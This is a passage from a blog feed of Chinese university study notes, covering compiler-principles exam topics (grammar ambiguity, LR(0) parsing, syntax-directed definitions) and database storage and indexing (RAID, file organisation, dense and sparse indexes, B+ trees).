class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>中会产生两个语法树，这里没有体现*的优先级</li><li>解决：引入新非终结符，增加一个新的子结构</li><li>低优先级的结构靠近开始符号</li><li>高优先级的结构靠近终结符号</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>E</mi><mo>∗</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">E\rightarrow E +E | E*E|id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>改写为<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>T</mi><mi mathvariant="normal">∣</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">E \rightarrow E+T|T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq><br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>→</mo><mi>T</mi><mo>∗</mo><mi>F</mi><mi mathvariant="normal">∣</mi><mi>F</mi></mrow><annotation encoding="application/x-tex">T \rightarrow T*F|F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></eq><br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>→</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">F \rightarrow id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq><br>这样可以通过设定优先级去除二义性</li></ul></li></ul></li></ul><h3 id="%E7%AC%AC%E5%9B%9B%E9%81%93-%E8%87%AA%E4%B8%8B%E8%80%8C%E4%B8%8A%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">第四道 自下而上语法分析</h3><h4 id="1.2-%E6%B1%82lr(0)%E9%A1%B9%E7%9B%AE%E9%9B%86%EF%BC%8C%E8%AF%86%E5%88%AB%E6%B4%BB%E5%89%8D%E7%BC%80" tabindex="-1">1.2 求LR(0)项目集，识别活前缀</h4><ul><li>求LR(0)项目集<ul><li>如果只求某状态的，仅考虑入边即可</li></ul></li><li>构造LR(0)自动机</li><li>活前缀：跑自动机看能否识别</li></ul><h4 id="3%2C4-%E6%9E%84%E9%80%A0lr%E5%88%86%E6%9E%90%E8%A1%A8%EF%BC%8C%E7%BB%99%E5%87%BAlr%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B" tabindex="-1">3,4 构造LR分析表，给出LR分析过程</h4><h3 id="%E7%AC%AC%E4%BA%94%E9%81%93" tabindex="-1">第五道</h3><ul><li><p>语法知道定义SDD：是一个上下文无关文法的属性及规则的定义</p><ul><li>文法符号具有某些属性<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">.</mi><mi>a</mi><mo separator="true">,</mo><mi>X</mi><mi mathvariant="normal">.</mi><mi>b</mi><mtext>等</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(X.a, X.b 等)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">.</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">.</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">等</span><span class="mclose">)</span></span></span></span></eq></li><li>文法的产生式具有某些语义规则(语义规则用于解释这些值得传递和计算)</li></ul></li><li><p>属性分类</p><ul><li>综合属性（自下而上得传递消息）<ul><li>语法规则上：根据产生式右部的符号属性计算左部被定义的符号的综合属性</li><li>语法树上：根据子节点的属性和父节点自身的属性计算父节点的综合属性</li></ul></li><li>继承属性（自上而下传递消息）<ul><li>语法规则上：根据右部候选式中的符号的属性和左部被定义的符号的属性计算右部候选式中符号的继承属性</li><li>语法树上：根据父节点和兄弟节点的属性计算子节点的继承属性</li></ul></li></ul></li><li><p>带注释的语法树：在语法树的基础上加上属性</p></li></ul><h3 id="%E7%AC%AC%E5%85%AD%E9%81%93" tabindex="-1">第六道</h3><p>跟汇编很像，不难</p><h3 id="%E7%AC%AC%E4%B8%83%E9%81%93" tabindex="-1">第七道</h3><p>给出错误的C语言程序，指出错误</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统复习</title>
      <link href="/2023/08/16/%E6%9C%AC%E7%A7%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/08/16/%E6%9C%AC%E7%A7%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<img src="/images/meitu/2.jpg"><p>主要观看 <a href="https://www.bilibili.com/video/BV1VE411h7hq?p=176&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">数据库系统实现网课</a>1700后的内容所成笔记。</p><p>与 数据库系统实现（机械工业出版社）所讲内容基本吻合，但在具体部分所讲的顺序有略有不同，但考虑到啃书（尤其是机翻工业出版社的书）有些困难，所以先过一边网课再啃书。<br>网课中得顺序有些与书中不同，这里需要注意。<br>[toc]</p><h2 id="%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E8%BE%85%E5%8A%A9%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86" tabindex="-1">第二章 辅助存储管理</h2><h3 id="01-%E5%AD%98%E5%82%A8%E4%BD%93%E7%B3%BB%E5%9B%9E%E9%A1%BE" tabindex="-1">01 存储体系回顾</h3><h4 id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E7%BB%84%E7%BB%87%E7%9A%84%E5%9F%BA%E7%A1%80%E2%80%93%E5%AD%98%E5%82%A8%E4%BD%93%E7%B3%BB" tabindex="-1">（1）数据组织的基础–存储体系</h4><li>将不同性价比的存储器组织在一起，满足高速度，大容量，低价格需求</li><li>CPU与内存直接交换信息，按存储单元（字）进行访问</li><li>外存按存储块进行访问，其信息先装入内存，才能被CPU处理。<h4 id="%EF%BC%882%EF%BC%89%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AF%B9%E6%95%B0%E6%8D%AE%E7%9A%84%E7%BB%84%E7%BB%87" tabindex="-1">（2）操作系统对数据的组织</h4><p>FAT-目录-磁盘块/簇</p><p>FAT（文件分配表 File Allocation Table）</p><h4 id="%EF%BC%883%EF%BC%89%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86" tabindex="-1">（3）内存管理</h4></li><li>一条记录的地址=存储单元的地址=内存地址=页面：页面偏移量</li><li>页面 = 块</li><li>内存页面的分配</li><li>内存页面的置换<h3 id="02-%E7%A3%81%E7%9B%98%E7%9A%84%E7%BB%93%E6%9E%84%E4%B8%8E%E7%89%B9%E6%80%A7" tabindex="-1">02 磁盘的结构与特性</h3><h4 id="%EF%BC%881%EF%BC%89%E7%A3%81%E7%9B%98%E5%8F%8A%E7%A3%81%E7%9B%98%E5%AE%B9%E9%87%8F" tabindex="-1">（1）磁盘及磁盘容量</h4><p>此处应为磁盘结构图</p><p>磁盘位置表述：盘面：磁道：扇区</p><p>磁盘读写单位：扇区(sector)-&gt;簇cluster/块(block)</p><h4 id="%EF%BC%882%EF%BC%89%E7%A3%81%E7%9B%98%E7%9A%84%E8%AE%BF%E9%97%AE" tabindex="-1">（2）磁盘的访问</h4><p>寻道时间(1-20ms)<br>旋转时间(0-10ms)<br>传输时间(每4KB页&lt;1ms)</p><p>三个时间的和称为延迟</p><p>物理存取算法考虑的关键：降低I/O次数</p><p>降低排队等候时间&lt;==&gt;降低寻道/旋转延迟时间</p></li><li>同一磁道连续存储</li><li>同一柱面不同磁道并行块存储</li><li>多个磁盘并行块存储<h4 id="%EF%BC%883%EF%BC%89%E6%8F%90%E9%AB%98%E7%A3%81%E7%9B%98%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%86%99%E6%97%B6%E9%97%B4%E4%B8%8E%E5%AD%98%E5%82%A8%E5%8F%AF%E9%9D%A0%E6%80%A7%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">（3）提高磁盘数据读写时间与存储可靠性的方法</h4><p>RAID技术：Redundant Array of Independent Disk(独立磁盘冗余磁盘阵列)</p><p>主要思想：</p></li><li>并行处理：并行读取多个磁盘<ul><li>    比特级拆分：一个字节被拆分成八个比特位，不同比特位存储于不同磁盘</li><li>    块级拆分：一个文件由多个块组成，不同块存储于不同磁盘</li></ul></li><li>可靠性<ul><li>    扇区/块读写校验：对一个扇区/块读写做校验</li><li>    多个磁盘间共同构成的信息读写做校验。</li></ul></li><p>实现结果：</p><ol><li>RAID0 块级拆分但无冗余</li><li>RAID2 镜像处理：每个磁盘有个一镜像磁盘</li><li>RAID3 位交叉纠错处理：4个磁盘存储4位+3个校验盘P存储3校验位</li><li>RAID4 位交叉检验：4个磁盘存储4位+1个校验盘存储1校验位，位拆分存储(借助于扇区读写校验判断出出错磁盘再根据校验盘进行纠错)</li><li>RAID5 块交叉检验：块拆分存储，其它同上</li><li>RAID6 快交叉分布式校验：块拆分存储，互为校验盘</li><li>更多复杂冗余</li></ol><h3 id="03-%E6%9F%A5%E8%AF%A2%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3" tabindex="-1">03 查询实现的基本思想</h3><h4 id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E7%9A%84%E6%98%A0%E5%B0%84%E5%85%B3%E7%B3%BB%E7%A4%BA%E6%84%8F" tabindex="-1">（1）数据存储的映射关系示意</h4><p>查询操作算法  --&gt;<br>文件管理/索引管理：数据逻辑结构 --&gt;<br>内存-缓冲区管理 --&gt;<br>磁盘-磁盘管理：读/写 块 --&gt;</p><h4 id="%EF%BC%882%EF%BC%89%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E4%B8%8E%E6%9F%A5%E8%AF%A2%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A1%86%E6%9E%B6%E7%A4%BA%E6%84%8F" tabindex="-1">（2）数据存储与查询实现的基本框架示意</h4><img src="/images/本科/数据存储与查询实现的基本框架示意.jpg"><h3 id="04-%E8%AE%B0%E5%BD%95%E4%B8%8E%E8%A1%A8%E5%9C%A8%E7%A3%81%E7%9B%98%E4%B8%8A%E7%9A%84%E5%AD%98%E5%82%A8" tabindex="-1">04 记录与表在磁盘上的存储</h3><h4 id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E5%BF%B5%E4%B8%8E%E7%A3%81%E7%9B%98%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%E7%9A%84%E6%98%A0%E5%B0%84%E7%A4%BA%E6%84%8F" tabindex="-1">（1）数据库概念与磁盘相关概念的映射示意</h4><img src="/images/本科/数据库概念与磁盘相关概念的映射示意.jpg"><h4 id="%EF%BC%882%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E8%AE%B0%E5%BD%95%E7%9A%84%E5%8C%BA%E5%88%86%E5%8F%8A%E8%AE%B0%E5%BD%95%E5%B1%9E%E6%80%A7%E5%80%BC%E7%9A%84%E5%8C%BA%E5%88%86" tabindex="-1">（2）数据库中记录的区分及记录属性值的区分</h4><p>定长记录：按长度分记录<br>边长记录：按指针或标志区分记录</p><p>块头如何设计？</p><h4 id="%EF%BC%883%EF%BC%89-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%AE%B0%E5%BD%95-vs.%E7%A3%81%E7%9B%98%E5%9D%97" tabindex="-1">（3） 数据库中的记录 vs.磁盘块</h4><p>记录在磁盘中的存储：</p><p>非跨块存储：</p><li>浪费一些存储空间</li><li>磁盘块之间无关联可并行<p>跨块存储：靠指针连接</p></li><li>节省一些存储空间</li><li>磁盘间有关联需要串行<h4 id="%EF%BC%884%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8-vs.%E7%A3%81%E7%9B%98%E5%9D%97" tabindex="-1">（4）数据库中的表 vs.磁盘块</h4><p>表所占磁盘块的分配方法：</p></li><li>连续分配：数据块被分配到连续的数据块上(会存在扩展困难问题)</li><li>链接分配：数据块中包含指向下一数据块的指针(访问速度问题)</li><li>按簇分配：簇是若干连续的磁盘块，簇之间靠指针链接</li><li>索引分配：索引块中存放指向实际数据块的指针<h3 id="05-%E5%9B%9B%E7%A7%8D%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87%E6%96%B9%E6%B3%95" tabindex="-1">05 四种文件组织方法</h3><ol><li>无序文件组织</li><li>有序文件组织</li><li>散列文件组织</li><li>聚簇文件组织</li></ol><h4 id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E7%BB%84%E7%BB%87%E4%B8%8E%E5%AD%98%E5%8F%96%E6%96%B9%E6%B3%95" tabindex="-1">（1）数据组织与存取方法</h4></li><li>数据组织要考虑更新(增删改)和检索需求<ol><li>更新将涉及数据存储空间的扩展和回收问题</li><li>检索将涉及扫描整个数据库的问题，大批量处理数据问题</li><li>不同的需求要求不同的数据组织方法和存取方法</li></ol></li><li> 文件组织：指的是数据组织成记录，块和访问结构的方式，包括把记录和块存储在磁盘上的方式，以及记录块之间相互联系的方法。(可以理解为是一种数据结构)</li><li>存取方法：指的是对文件所采取的存取操作方法。（可以理解为在数据结构上使用的算法）</li><li>一种文件组织可以采用多种存取方法进行访问<h4 id="%EF%BC%882%EF%BC%89%E6%97%A0%E5%BA%8F%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87" tabindex="-1">（2）无序文件组织</h4></li><li>特点：记录可存储于任意空间的位置，磁盘上存储的记录是无序的。更新效率高，但检索效率可能 低。</li><li>如何建立？<p>方法1：新记录插入到文件尾部；删除记录时，可以直接删除该记录所在位置的内容，也可以在该记录前标记“删除标记”<br>方法2：在前者基础上，新增记录可以利用那些标记为“删除标记”的记录空间</p></li><li>频繁删增记录时会造成空间浪费，所以需要周期性重新组织数据库。<p>数据库重组 是通过移走被删除的记录使有效记录连续存放，从而回收那些由删除记录而产生的未利用空间。</p><h4 id="%EF%BC%883%EF%BC%89%E6%9C%89%E5%BA%8F%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87" tabindex="-1">（3）有序文件组织</h4></li><li>特点：记录按某属性或属性组值得顺序插入，磁盘上存储的记录是有序的。检索效率较高。</li><li>用户存储排序的属性通常称为 排序字段 ，通常，排序字段使用关系中的主码，所以又称排序码</li><li>当按排序字段进行检索时，速度得到很大提升</li><p>问题：</p><li>有序记录文件的更新效率可能很低</li><li>因为：在更新时要移动其它记录，为插入记录流出空间<p>改进：</p></li><li>改进措施是为将来可能插入的元组预留空间，或者再使用一个临时的无序文件（被称为溢出文件）保留新增的记录。</li><li>当采取溢出文件措施时，检索操作既要操作主文件，也要操作溢出文件</li><li>因此需要周期性地重组数据库</li><li>数据库重组是将溢出文件合并到主文件中，并恢复主文件中的记录顺序。<h4 id="%EF%BC%884%EF%BC%89%E6%95%A3%E5%88%97%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87" tabindex="-1">（4）散列文件组织</h4></li><li>特点：可以把记录按照某属性或属性组地值，依据一个散列函数来计算其应放位置：桶号（Bucket，块号或簇号等）。检索效率和更新效率都有一定程度的提升。</li><li>用于进行散列函数计算的属性通常称为散列字段，散列字段通常也采用关系中的主码，所以又称散列码。</li><li>不同记录可能被hash成同一桶号，此时需在顺序检索出某一记录。<p>优化：</p></li><li>链接法处理溢出</li><li>动态散列技术等<h4 id="%EF%BC%885%EF%BC%89%E8%81%9A%E7%B0%87%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87" tabindex="-1">（5）聚簇文件组织</h4></li><li>聚簇：将具有相同或相似属性值的记录存放在连续的磁盘簇块中</li><li>多表聚簇：将若干个相互关联的Table存储于一个文件中---这可以提高多表情况下的查询速度。<h3 id="06-oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%A9%E7%90%86%E5%AD%98%E5%82%A8%E7%AE%80%E4%BB%8B" tabindex="-1">06 Oracle数据库物理存储简介</h3><p>这个书上好像没有，先跳了</p><h3 id="07-%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%80%BB%E7%BB%93" tabindex="-1">07 第二章总结</h3><img src="/images/本科/数据库物理存储.jpg"><h2 id="%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%B4%A2%E5%BC%95%E7%BB%93%E6%9E%84" tabindex="-1">第三章 索引结构</h2><h3 id="01-%E7%B4%A2%E5%BC%95%E7%9A%84%E6%A6%82%E5%BF%B5%E5%92%8C%E4%BD%9C%E7%94%A8" tabindex="-1">01 索引的概念和作用</h3><h4 id="%EF%BC%881%EF%BC%89%E7%B4%A2%E5%BC%95%E7%9A%84%E6%A6%82%E5%BF%B5" tabindex="-1">（1）索引的概念</h4><p><code>索引</code>是定义在存储表基础上，有助于无需检查所有记录而快速定位所需记录的一种<code>辅助存储结构</code>，由一系列存储在磁盘上的<code>索引项</code>组成，每一项索引由两部分组成：</p><ol><li>索引字段，由Table中某些列中的值串接而成。索引中通常存储了索引字段的每一个值，索引字段类似于词典中的词条。</li><li>行指针：指向Table中包含索引字段值的记录 在磁盘上的存储位置，行指针类似于词条在数据，词典中出现的页码</li></ol></li><li>存储索引项的文件为索引文件，相对应，存储表又称主文件</li><h4 id="%EF%BC%882%EF%BC%89%E7%B4%A2%E5%BC%95%E7%9A%84%E4%B8%80%E8%88%AC%E6%80%A7%E7%89%B9%E7%82%B9" tabindex="-1">（2）索引的一般性特点</h4><li>索引文件是一种辅助存储结构，其存在不改变存储表的物理存储结构，但可以明显提高存储表的访问速度</li><li>索引文件组织方式有两种：<ol><li>排序索引文件：按索引字段值的某一种顺序组织存储</li><li>散列索引文件：依据索引字段值使用散列函数分配散列桶的方式存储</li></ol></li><li>主文件组织有 堆文件，排序文件，散列文件，聚簇文件等多种方式</li><li>在一个表上可以针对不同的属性值或属性组和建立不同的索引文件，可建立多个索引文件。索引字段的值可以是table中的任何一个属性的值或任何多个属性值的组合值</li><li>索引文件比主文件小很多，通过检索一个小的索引文件（可以全部装载进内存），快速定位后，再有针对性的读取非常大的主文件中的有关记录</li><li>有索引时，更新操作必须同步更新索引文件和主文件<h4 id="%EF%BC%883%EF%BC%89%E5%85%B3%E4%BA%8E%E7%B4%A2%E5%BC%95%E5%BA%94%E7%94%A8%E7%9A%84%E8%AF%84%E4%BB%B7%E9%97%AE%E9%A2%98" tabindex="-1">（3）关于索引应用的评价问题</h4></li><li>索引技术应用是检索效率大幅度提高，但同时也增加了存储空间，使维护负担加重</li><li>衡量索引性能好坏： 1 访问时间 2 插入时间 3 删除时间 4 空间负载 5 支持存取的有效比<h4 id="%EF%BC%884%EF%BC%89%E7%B4%A2%E5%BC%95%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%E7%9A%84%E5%8C%BA%E5%88%86" tabindex="-1">（4）索引相关概念的区分</h4></li><li>字段，排序字段，索引字段</li><li>码（Key），主码，又称表键---具有唯一性</li><li>排序码：对主文件进行排序存储的那些属性或属性组</li><li>索引码：即索引字段，不一定具有唯一性</li><li>搜索码：在主文件中查找记录的属性或属性集<h3 id="02-sql%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E7%B4%A2%E5%BC%95%E5%88%9B%E5%BB%BA%E4%B8%8E%E7%BB%B4%E6%8A%A4" tabindex="-1">02 SQL语言中的索引创建与维护</h3><p>书上没有，先跳了</p><h3 id="03-%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95%E5%92%8C%E7%A8%80%E7%96%8F%E7%B4%A2%E5%BC%95" tabindex="-1">03 稠密索引和稀疏索引</h3><h4 id="%EF%BC%881%EF%BC%89%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95%E5%92%8C%E7%A8%80%E7%96%8F%E7%B4%A2%E5%BC%95%E6%A6%82%E5%BF%B5" tabindex="-1">（1）稠密索引和稀疏索引概念</h4></li><li>对于一个主文件中的每一个记录（形成的每一个索引字段值），都有一个索引项和它对应，指明该记录所在位置。这样的索引称为稠密索引</li><li>对于主文件中的部分记录(形成的索引字段值)，有索引项和它对应，这样的索引称为 非稠密索引或稀疏索引<h4 id="%EF%BC%882%EF%BC%89%E7%A8%80%E7%96%8F%E7%B4%A2%E5%BC%95%E5%A6%82%E4%BD%95%E5%AE%9A%E4%BD%8D%E8%AE%B0%E5%BD%95" tabindex="-1">（2）稀疏索引如何定位记录</h4></li><li>索引文件中不存在搜索码的值，不代表主文件没有对应搜索码的记录</li><li>定位索引字段值为K的记录，需要<ol><li>首先找相邻的小于K的最大索引字段值对应的索引项</li><li>从该索引项对应的记录考试顺序进行table的检索</li></ol></li><li>稀疏索引的使用要求--主文件必须是按对应检索字段属性排序存储</li><li>相比稠密搜索：空间占用更少，维护任务更轻，但速度较慢</li><li>平衡：索引项不指向记录指针，而是指向记录所在存储块的指针，即每一个存储块有一个索引项，而不是每条记录有一个索引项<h4 id="%EF%BC%883%EF%BC%89-%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95%E5%A6%82%E4%BD%95%E5%AE%9A%E4%BD%8D%E8%AE%B0%E5%BD%95" tabindex="-1">（3） 稠密索引如何定位记录</h4><p>候选键属性的稠密索引：先查索引，然后再根据索引读主文件。</p><p>非候选键属性的稠密索引：</p><p>第一种情况：索引文件中索引字段值是不重复的；主文件按检索字段排序且索引字段不是候选键。</p><p>第二种情况：索引文件中索引字段值有重复；主文件 未按索引字段排序且索引字段不是候选键。</p><p>第三种情况：引入指针桶处理非候选键索引的多记录情况；主文件未按检索字段排序且检索字段不是候选键。</p><h3 id="04-%E4%B8%BB%E7%B4%A2%E5%BC%95%E4%B8%8E%E8%BE%85%E5%8A%A9%E7%B4%A2%E5%BC%95" tabindex="-1">04 主索引与辅助索引</h3><h4 id="%EF%BC%881%EF%BC%89%E4%B8%BB%E7%B4%A2%E5%BC%95" tabindex="-1">（1）主索引</h4><p>主索引通常是每一存储块有一个索引项，索引项的总数和存储表所占的存储块数目相同，存储表的每一存储块的第一条记录，又称为锚记录，或者称为块锚。</p></li><li>主索引的索引字段值为块锚的索引字段值，而指针指向其所在的存储块</li><li>主索引是是按索引字段值进行排序的一个有序文件，通常建立在有序主文件的基于主码的排序字段上，即主索引的索引字段与主文件的主码有对应关系</li><li>主索引是稀疏索引<h4 id="%EF%BC%882%EF%BC%89-%E8%BE%85%E5%8A%A9%E7%B4%A2%E5%BC%95" tabindex="-1">（2） 辅助索引</h4><p>辅助索引是定义在主文件的任意或者多个非排序字段上的辅助存储结构。</p></li><li>辅助索引通常是对某一非排序字段上的每一个不同值有一个索引项；索引字段既是该字段的不同值，而指针则指向包含该纪录的块或该记录本身</li><li>当非排序字段为索引字段时，如果该字段值不唯一，则要采用一个类似链表的结构来保存包含该字段值的所有记录的位置</li><li>辅助索引是稠密索引，检索效率有时相当高<h4 id="%EF%BC%883%EF%BC%89%E5%B7%AE%E5%88%AB" tabindex="-1">（3）差别</h4></li><li>一个主文件只有一个主索引，但可以有多个辅助索引</li><li>主索引通常建立在主码/排序码上；辅助索引建立在其他属性上</li><li>可以利用主索引重新组织主文件数据，但辅助索引不能改变主文件数据</li><li>主索引是稀疏索引，辅助索引是稠密索引<h3 id="05-%E5%85%B6%E4%BB%96%E7%B4%A2%E5%BC%95" tabindex="-1">05 其他索引</h3><h4 id="%EF%BC%881%EF%BC%89%E8%81%9A%E7%B0%87%E7%B4%A2%E5%BC%95%E4%B8%8E%E9%9D%9E%E8%81%9A%E7%B0%87%E7%B4%A2%E5%BC%95" tabindex="-1">（1）聚簇索引与非聚簇索引</h4><p>聚簇索引：是指索引中邻近的记录在著文件中也是临近存储的<br>非聚簇索引：是指索引中邻近的记录在主文件中不一定是临近存储的</p><h4 id="%EF%BC%882%EF%BC%89%E5%80%92%E6%8E%92%E7%B4%A2%E5%BC%95" tabindex="-1">（2）倒排索引</h4><p>正排：一个文档包含了哪些词汇<br>倒排：一个词汇包含在哪些文档中</p><h4 id="%EF%BC%883%EF%BC%89%E5%85%B6%E5%AE%83%E7%B4%A2%E5%BC%95" tabindex="-1">（3）其它索引</h4></li><li>多级索引：当索引想比较多时，可以对索引再建立索引，形成多级索引。 常见多级索引有B树/B+树，以树形数据结构来组织索引项。</li><li>多属性索引：索引字段由table的多个属性值组合在一起形成的索引</li><li>散列索引：使用散列技术组织的索引</li><li>网格索引：使用多索引字段进行交叉联合定位与检索<h3 id="06-b%2B%E6%A0%91%E7%B4%A2%E5%BC%95%EF%BC%88%E4%B9%A6%E4%B8%8A%E6%98%AFb%E6%A0%91%EF%BC%89" tabindex="-1">06 B+树索引（书上是B树）</h3><h4 id="%EF%BC%881%EF%BC%89%E5%A4%9A%E7%BA%A7%E7%B4%A2%E5%BC%95" tabindex="-1">（1）多级索引</h4><p>当索引较多时，可以对索引再建立索引</p><h4 id="%EF%BC%882%EF%BC%89b%2B%E6%A0%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5" tabindex="-1">（2）B+树的基本概念</h4><p>B+树索引：一种以树形数据结构来组织索引项的多级索引</p><p>一块中索引项的组织：<br>Ki:索引字段值<br>Pj：指针，只想索引块或数据块或数据块中记录的指针</p><p>索引文件的叶子节点的指针指向主文件的数据块</p><p>B+树能自动保持与主文件大小相适应的树的层次，每个索引块指针的利用率都大于50%</p><h4 id="%EF%BC%883%EF%BC%89b%2B%E6%A0%91%E7%9A%84%E5%AD%98%E5%82%A8%E7%BA%A6%E5%AE%9A" tabindex="-1">（3）B+树的存储约定</h4><p>B+树有一个参数n，决定了树的所有存储块的状态</p></li><li>一块中有 n-1 个索引项（<索引字段值Ki，指针Pi>） + 1个指针（Pn）<p>示例： 